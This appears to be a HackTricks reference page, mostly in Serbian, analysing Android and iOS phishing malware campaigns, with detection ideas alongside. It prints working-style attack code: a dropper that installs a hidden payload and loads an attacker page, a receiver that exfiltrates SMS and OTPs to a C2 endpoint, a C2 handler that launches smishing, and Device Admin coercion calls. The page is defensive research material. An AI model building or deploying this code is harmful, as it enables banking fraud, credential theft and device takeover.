# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica pokriva tehnike koje koriste threat actors za distribuciju **malicious Android APKs** i **iOS mobile-configuration profiles** putem phishinga (SEO, social engineering, lažne prodavnice, dating apps, itd.).
> Materijal je adaptiran iz SarangTrap kampanje otkrivene od strane Zimperium zLabs (2025) i drugih javno dostupnih istraživanja.

## Tok napada

1. **SEO/Phishing Infrastructure**
* Registrujte desetine sličnih domena (dating, cloud share, car service…).
– Koristite lokalne ključne reči i emotikone u `<title>` elementu da biste se bolje rangirali na Google.
– Smeštajte *i* Android (`.apk`) i iOS uputstva za instalaciju na istoj landing stranici.
2. **First Stage Download**
* Android: direktan link do *unsigned* ili “third-party store” APK-a.
* iOS: `itms-services://` ili običan HTTPS link ka zlonamernom **mobileconfig** profilu (vidi dole).
3. **Post-install Social Engineering**
* Pri prvom pokretanju app traži **invitation / verification code** (iluzija ekskluzivnog pristupa).
* Kod se **POSTuje preko HTTP** ka Command-and-Control (C2).
* C2 vraća `{"success":true}` ➜ malware nastavlja sa radom.
* Sandbox / AV dinamička analiza koja nikada ne pošalje validan kod ne vidi **maliciozno ponašanje** (evasion).
4. **Runtime Permission Abuse** (Android)
* Opasna dopuštenja se traže tek **nakon pozitivnog C2 odgovora**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Novije varijante **uklanjaju `<uses-permission>` za SMS iz `AndroidManifest.xml`** ali ostavljaju Java/Kotlin kod putanju koja čita SMS putem reflection ⇒ snižava statički score dok je i dalje funkcionalno na uređajima koji daju dozvolu preko `AppOps` zloupotrebe ili na starijim ciljevima.
5. **Facade UI & Background Collection**
* Aplikacija prikazuje bezopasne view-e (SMS viewer, gallery picker) implementirane lokalno.
* U međuvremenu eksfiltrira:
- IMEI / IMSI, broj telefona
- Potpuni dump `ContactsContract` (JSON array)
- JPEG/PNG iz `/sdcard/DCIM` kompresovane sa [Luban](https://github.com/Curzibn/Luban) da bi se smanjila veličina
- Opcionalno SMS sadržaj (`content://sms`)
Payloads su **batch-zipped** i šalju se preko `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Jedan **mobile-configuration profile** može zahtevati `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. da bi enroll-ovao uređaj u “MDM”-sličan nadzor.
* Social-engineering uputstva:
1. Otvorite Settings ➜ *Profile downloaded*.
2. Tapnite *Install* tri puta (screenshot-ovi na phishing stranici).
3. Trust unsigned profile ➜ napadač dobija *Contacts* & *Photo* entitlements bez App Store revizije.
7. **Network Layer**
* Plain HTTP, često na portu 80 sa HOST headerom poput `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (nema TLS → lako uočljivo).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Tokom procene malvera, automatizujte fazu sa invitation kodom pomoću Frida/Objection da biste došli do maliciozne grane.
* **Manifest vs. Runtime Diff** – Uporedite `aapt dump permissions` sa runtime `PackageManager#getRequestedPermissions()`; nedostajuća opasna dopuštenja su crvena zastavica.
* **Network Canary** – Konfigurišite `iptables -p tcp --dport 80 -j NFQUEUE` da detektujete neobične POST burst-ove nakon unosa koda.
* **mobileconfig Inspection** – Koristite `security cms -D -i profile.mobileconfig` na macOS-u da izlistate `PayloadContent` i uočite preterana entitlements.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** za detekciju naglih pojavljivanja domena bogatih ključnim rečima.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` od Dalvik klijenata izvan Google Play.
* **Invite-code Telemetry** – POST 6–8 cifrenih numeričkih kodova ubrzo nakon instalacije APK-a može ukazivati na staging.
* **MobileConfig Signing** – Blokirajte unsigned configuration profiles putem MDM politike.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indikatori (generički)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video kao mamac → opis sadrži skraćeni link
- Skraćeni link → GitHub Pages phishing sajt koji imitira legitimni portal
- Isti GitHub repo hostuje APK sa lažnim “Google Play” znakom koji linkuje direktno na fajl
- Dinamične phishing stranice žive na Replit; kanal za daljinske komande koristi Firebase Cloud Messaging (FCM)

### Dropper sa ugrađenim payload-om i offline instalacijom
- Prvi APK je installer (dropper) koji isporučuje pravi malware na `assets/app.apk` i podstiče korisnika da isključi Wi‑Fi/mobilne podatke kako bi oslabio detekciju u oblaku.
- Ugrađeni payload se instalira pod neupadljivim imenom (npr. “Secure Update”). Nakon instalacije, i installer i payload su prisutni kao odvojene aplikacije.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamičko otkrivanje endpointa putem shortlink
- Malware preuzima plain-text, comma-separated list live endpoints sa shortlinka; jednostavne string transforms proizvode konačni phishing page path.

Primer (sanitizovano):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Korak “Make payment of ₹1 / UPI‑Lite” učitava napadački HTML obrazac sa dinamičkog endpointa unutar WebView i hvata osetljiva polja (telefon, banka, UPI PIN) koja se `POST`uju na `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Samo-širenje i presretanje SMS/OTP
- Na prvom pokretanju traže se agresivne dozvole:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakti se u petlji koriste za masovno slanje smishing SMS-ova sa uređaja žrtve.
- Dolazni SMS-ovi se presreću pomoću broadcast receiver-a i otpremaju sa metapodacima (pošiljalac, sadržaj, SIM slot, nasumični ID po uređaju) na `/addsm.php`.

Skica receiver-a:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kao robustan C2
- Payload se registruje na FCM; push poruke nose polje `_type` koje se koristi kao prekidač za pokretanje akcija (npr. ažuriranje phishing text templates, prebacivanje ponašanja).

Primer FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Skica handlera:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Obrasci za otkrivanje i IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView učitava plaćanje sa `gate.htm` i eksfiltrira na `/addup.php`
- SMS eksfiltracija na `/addsm.php`
- Preuzimanje konfiguracije preko shortlinka (npr. `rebrand.ly/*`) koje vraća CSV endpoints
- Aplikacije označene generički kao “Update/Secure Update”
- FCM `data` messages with a `_type` diskriminator u nepouzdanim aplikacijama

### Ideje za detekciju i odbranu
- Obeležiti aplikacije koje traže od korisnika da onemoguće mrežu tokom instalacije i potom side-loaduju drugi APK iz `assets/`.
- Upozoravati na kombinaciju dozvola: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Praćenje egress saobraćaja za `POST /addup.php|/addsm.php` na ne-korporativnim hostovima; blokirati poznatu infrastrukturu.
- Mobile EDR pravila: nepouzdana aplikacija koja se registruje za FCM i grana se na `_type` polju.

---

## Android Accessibility/Overlay i zloupotreba Device Admin, ATS automatizacija i orkestracija NFC relay-a – studija slučaja RatOn

Kampanja RatOn banker/RAT (ThreatFabric) je konkretan primer kako moderne mobilne phishing operacije kombinuju WebView droppere, Accessibility-vođenu UI automatizaciju, overlay-e/ransom, prinudu putem Device Admin, Automated Transfer System (ATS), preuzimanje crypto wallet-a, pa čak i orkestraciju NFC-relaya. Ovaj odeljak apstrahuje ponovljivo upotrebljive tehnike.

### Faza-1: WebView → native install bridge (dropper)
Napadači prikažu WebView usmeren na napadačevu stranicu i injektuju JavaScript interfejs koji izlaže native installer. Tap na HTML dugme poziva native kod koji instalira drugostepeni APK uključen u assets droppera i zatim ga direktno pokreće.

Minimalni obrazac:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
HTML na stranici:
```html
<button onclick="bridge.installApk()">Install</button>
```
Након инсталације, dropper покреће payload путем explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 opens a WebView that hosts an “Access” page. Its button invokes an exported method that navigates the victim to the Accessibility settings and requests enabling the rogue service. Once granted, malware uses Accessibility to auto-click through subsequent runtime permission dialogs (contacts, overlay, manage system settings, etc.) and requests Device Admin.

- Accessibility programmatically helps accept later prompts by finding buttons like “Allow”/“OK” in the node-tree and dispatching clicks.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Vidi takođe:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/otkupnina putem WebView
Operateri mogu izdavati komande da:
- prikažu overlay preko celog ekrana sa URL-a, ili
- proslede inline HTML koji se učitava u WebView overlay.

Verovatne upotrebe: prisila (unos PIN-a), otvaranje novčanika radi hvatanja PIN-ova, ransom poruke. Imajte komandu koja osigurava da je dozvola za overlay dodeljena ako nedostaje.

### Remote control model – tekstualni pseudo-ekran + screen-cast
- Niska propusnost: periodično dump-ovati Accessibility node tree, serijalizovati vidljive tekstove/role/granice i poslati na C2 kao pseudo-ekran (komande poput `txt_screen` jednom i `screen_live` kontinuirano).
- Visoka verodostojnost: zatražiti MediaProjection i pokrenuti screen-casting/snimanje na zahtev (komande kao `display` / `record`).

### ATS playbook (automatizacija bankovne aplikacije)
Za zadatak u JSON formatu, otvoriti bankovnu aplikaciju, upravljati UI preko Accessibility koristeći mešavinu tekstualnih upita i tapova po koordinatama, i uneti žrtvin PIN za plaćanje kada se to zatraži.

Primer zadatka:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Primeri tekstova viđenih u jednom target flow-u (CZ → EN):
- "Nová platba" → "Nova uplata"
- "Zadat platbu" → "Unesi uplatu"
- "Nový příjemce" → "Novi primalac"
- "Domácí číslo účtu" → "Domaći broj računa"
- "Další" → "Dalje"
- "Odeslat" → "Pošalji"
- "Ano, pokračovat" → "Da, nastavi"
- "Zaplatit" → "Plati"
- "Hotovo" → "Gotovo"

Operateri takođe mogu proveravati/uvećavati limite transfera putem komandi kao što su `check_limit` i `limit` koje na sličan način prolaze kroz interfejs za limite.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Tok: unlock (ukradeni PIN ili dostavljena lozinka), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs se koriste da povećaju mogućnosti PIN-capture i da ometaju žrtvu:

- Odmah zaključavanje:
```java
dpm.lockNow();
```
- Istekni trenutni credential da bi se prisilila promena (Accessibility hvata novi PIN/lozinku):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Prisilite otključavanje bez biometrije onemogućavanjem keyguard biometric features:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Napomena: Mnoge DevicePolicyManager kontrole zahtevaju Device Owner/Profile Owner na novijim Android verzijama; neke OEM izrade mogu biti popustljive. Uvek potvrdi na ciljanom OS/OEM.

### Orkestracija NFC relay-a (NFSkate)
Stage-3 može instalirati i pokrenuti eksterni NFC-relay modul (npr. NFSkate) i čak mu predati HTML šablon kojim se vodi žrtva tokom relay-a. Ovo omogućava beskontaktni card-present cash-out uz online ATS.

Pozadina: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Komandni skup operatora (primer)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Ideje za detekciju i odbranu (RatOn-style)
- Tragaj za WebViews koje izlažu installer/permission metode preko `addJavascriptInterface()`; stranice koje se završavaju sa “/access” i izazivaju Accessibility promptove.
- Alarmiraj aplikacije koje generišu visokofrekventne Accessibility gestove/klikove ubrzo nakon dobijanja pristupa servisu; telemetrija koja liči na Accessibility node dumps poslatu ka C2.
- Prati promene Device Admin policy-ja u nepouzdanim aplikacijama: `lockNow`, isteka lozinke, togglovi keyguard feature-a.
- Alarmiraj na MediaProjection promptove iz nekorporativnih aplikacija nakon kojih sledi periodični upload frejmova.
- Detektuj instalaciju/pokretanje eksternog NFC-relay app-a koji je pokrenut od strane druge aplikacije.
- Za banking: primeniti potvrde van kanala (out-of-band), vezivanje za biometriju i limite transakcija otporne na automatizaciju na uređaju.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
